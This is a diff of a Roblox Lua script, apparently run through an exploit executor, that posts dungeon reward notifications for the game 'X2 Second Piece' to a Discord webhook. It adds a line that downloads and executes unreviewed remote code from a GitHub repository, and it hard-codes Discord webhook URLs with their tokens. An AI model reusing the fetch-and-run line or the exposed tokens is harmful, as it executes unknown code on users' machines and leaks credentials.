@@ -1,58 +1,65 @@
-local webhooklink = "https://discord.com/api/webhooks/992760768196005960/2K8OAwaO1j98e24Ec9NZC3QT7HYiALPouh3BodHFzP0H454_-cwxOWxzUndIEYnAEdkj"
+local webhook = "https://discord.com/api/webhooks/1224516274126589992/cYyfv71-3Up9nEhzOQGaSmphNksbtMy6t67l7G57-EqY5HqCHeM3pJ4MSANJp3un9wBz"
 
-task.spawn(function ()
-    while wait() do pcall(function ()
-        for i,v in pairs(game.Workspace.World.Portal:GetChildren()) do
-            if v.Name == "1" and v:FindFirstChild("FIND ME") == nil then
-local webhook = webhooklink
-local timeInfo = os.date("*t")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Mangadexwannatest/flag123te/main/GEG"))()
 
-BBody = game:GetService("HttpService"):JSONEncode({
-      content = nil,
-      embeds = {{
-          ["author"] = {
-              ["name"] = "Second Piece Notify",
-              ["icon_url"] = "https://tr.rbxcdn.com/6536b9e54e326d9ebc730845842e5363/150/150/Image/Png"
-          },
-          ["title"] = "Portal", 
-          ["icon_url"] = "https://tr.rbxcdn.com/6536b9e54e326d9ebc730845842e5363/150/150/Image/Png",
-          ["footer"] = {
-              ["text"] = "Time : " .. timeInfo.hour .. ":" .. timeInfo.min,
-              ["icon_url"] = "https://tr.rbxcdn.com/6536b9e54e326d9ebc730845842e5363/150/150/Image/Png"
-         
-          },
-          ["color"] = tonumber(0xFFD700),
-          ["url"] = "https://www.roblox.com/games/15049111150/X2-Second-Piece",
-          ["fields"] = {
-          
-                         {
-                ["name"] = "Tier",
-                ["value"] = v.BilboardGui.TextLable.Text.." Rarity : Common",
-                ["inline"] = false
-                  
-              },
-            
-          }
-          }}
-      })
-  local response = syn.request({
-  Url = webhook,
-  Method = "POST",
-  Headers = {
-      ["Content-Type"] = "application/json"
-  },
-  Body = BBody
-})    
-print("ADD")
-local PartAdd = Instance.new("Part" , v)
-PartAdd.Name = "FIND ME"
-PartAdd.CanCollide = false
-PartAdd.Transparency = 0
-PartAdd.Anchored = true
-PartAdd.Size = Vector3.new(1,1,1)
-PartAdd.CFrame = v.CFrame
+function Webhook()
+    for i,v in pairs(game.Players.LocalPlayer.PlayerGui.ItemRewardGui.Interface.ItemRewardFrame:GetChildren()) do
+        if v.ClassName == "Frame" then
+            for _,v2 in pairs(v:GetDescendants()) do
+                if v2.Name == "WorldModel" then
+                    for l,v3 in pairs(v2:GetChildren()) do
+                        local timeInfo = os.date("*t")
+                        
+                        BBody = game:GetService("HttpService"):JSONEncode({
+                              content = nil,
+                              embeds = {{
+                                  ["author"] = {
+                                      ["name"] = "Second Piece Notify",
+                                      ["icon_url"] = "https://tr.rbxcdn.com/6536b9e54e326d9ebc730845842e5363/150/150/Image/Png"
+                                  },
+                                  ["title"] = "Second Piece", 
+                                  ["icon_url"] = "https://tr.rbxcdn.com/6536b9e54e326d9ebc730845842e5363/150/150/Image/Png",
+                                  ["footer"] = {
+                                      ["text"] = "Time : " .. timeInfo.hour .. ":" .. timeInfo.min,
+                                      ["icon_url"] = "https://tr.rbxcdn.com/6536b9e54e326d9ebc730845842e5363/150/150/Image/Png"
+                                 
+                                  },
+                                  ["color"] = tonumber(0xFFD700),
+                                  ["url"] = "https://www.roblox.com/games/15049111150/X2-Second-Piece",
+                                  ["fields"] = {
+                                  
+                                                 {
+                                        ["name"] = "Reward",
+                                        ["value"] = "Item : "..v3.Name,
+                                        ["inline"] = false
+                                          
+                                      },
+                                    
+                                  }
+                                  }}
+                              })
+                          local response = syn.request({
+                          Url = webhook,
+                          Method = "POST",
+                          Headers = {
+                              ["Content-Type"] = "application/json"
+                          },
+                          Body = BBody
+                        })    
+                       end
+                    end
+                end
             end
         end
-     end)
     end
+    
+
+task.spawn(function ()
+    pcall(function () 
+    game.Players.LocalPlayer.PlayerGui.Dungeon.Wave:GetPropertyChangedSignal("Text"):Connect(function()
+        wait(1)
+        Webhook()
+        print("Wave Changed")
+          end)
+      end)
 end)
